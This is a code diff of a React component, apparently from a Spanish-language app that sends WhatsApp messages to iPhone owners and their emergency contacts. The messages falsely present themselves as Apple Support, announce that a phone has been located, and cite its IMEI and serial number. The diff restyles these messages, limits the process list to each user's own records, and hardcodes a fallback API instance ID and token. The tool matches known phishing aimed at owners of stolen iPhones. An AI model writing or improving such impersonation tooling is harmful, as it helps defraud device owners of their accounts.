@@ -69,20 +69,13 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         return;
       }
 
-      let query = supabase
+      // CAMBIO: Tanto admin como usuario solo ven sus propios procesos
+      console.log('Loading processes for user:', session.user.id);
+      const { data, error } = await supabase
         .from('processes')
         .select('*')
+        .eq('user_id', session.user.id)
         .order('created_at', { ascending: false });
-
-      // Si es usuario normal, solo mostrar sus procesos
-      if (userType === 'user') {
-        console.log('Loading processes for user:', session.user.id);
-        query = query.eq('user_id', session.user.id);
-      } else {
-        console.log('Loading all processes for admin');
-      }
-
-      const { data, error } = await query;
       
       console.log('Processes query result:', { data, error, userType });
 
@@ -159,35 +152,35 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       const instanceId = config?.whatsapp_instance || 'instance126876';
       const token = config?.whatsapp_token || '4ecj8581tubua7ry';
 
-      // Crear el mensaje personalizado según el tipo de contacto
+      // Crear el mensaje personalizado según el tipo de contacto con formato mejorado
       let message = '';
       
       if (process.contact_type === 'propietario') {
-        message = `Soporte de Apple 👨🏽‍🔧
+        message = `*🔧 Soporte de Apple 👨🏽‍🔧*
 
-✅ iPhone localizado con éxito
+*✅ iPhone localizado con éxito*
 
-📱 Modelo: ${process.iphone_model}
-💾 Almacenamiento: ${process.storage}
-🎨 Color: ${process.color}
-📟 IMEI: ${process.imei}
-🔑 Serie: ${process.serial_number}
+*📱 Modelo:* ${process.iphone_model}
+*💾 Almacenamiento:* ${process.storage}
+*🎨 Color:* ${process.color}
+*📟 IMEI:* ${process.imei}
+*🔑 Serie:* ${process.serial_number}
 
-🧾 Escribe la palabra Menu para solicitar asistencia.`;
+*🧾 Escribe la palabra Menu para solicitar asistencia.*`;
       } else {
-        message = `Soporte de Apple 👨🏽‍🔧
+        message = `*🔧 Soporte de Apple 👨🏽‍🔧*
 
-🚨 Usted ha sido registrado como contacto de emergencia.
+*🚨 Usted ha sido registrado como contacto de emergencia.*
 
-✅ iPhone localizado con éxito
+*✅ iPhone localizado con éxito*
 
-📱 Modelo: ${process.iphone_model}
-💾 Almacenamiento: ${process.storage}
-🎨 Color: ${process.color}
-📟 IMEI: ${process.imei}
-🔑 Serie: ${process.serial_number}
+*📱 Modelo:* ${process.iphone_model}
+*💾 Almacenamiento:* ${process.storage}
+*🎨 Color:* ${process.color}
+*📟 IMEI:* ${process.imei}
+*🔑 Serie:* ${process.serial_number}
 
-🧾 Escribe la palabra Menu para solicitar asistencia.`;
+*🧾 Escribe la palabra Menu para solicitar asistencia.*`;
       }
 
       // Enviar mensaje via WhatsApp API
@@ -273,7 +266,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
     <div className="space-y-6">
       <div className="flex justify-between items-center">
         <h2 className="text-2xl font-bold text-blue-300">
-          {userType === 'admin' ? 'Todos los Procesos' : 'Mis Procesos'} ({processes.length})
+          Mis Procesos ({processes.length})
         </h2>
         <Button
           onClick={loadProcesses}
@@ -291,10 +284,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
             <div className="text-center">
               <p className="text-blue-200/70 mb-4">No hay procesos guardados</p>
               <p className="text-blue-200/50 text-sm">
-                {userType === 'admin' 
-                  ? 'No hay procesos en el sistema o verifica tus permisos de administrador.'
-                  : 'Los procesos que agregues aparecerán aquí listos para enviar.'
-                }
+                Los procesos que agregues aparecerán aquí listos para enviar.
               </p>
             </div>
           </CardContent>
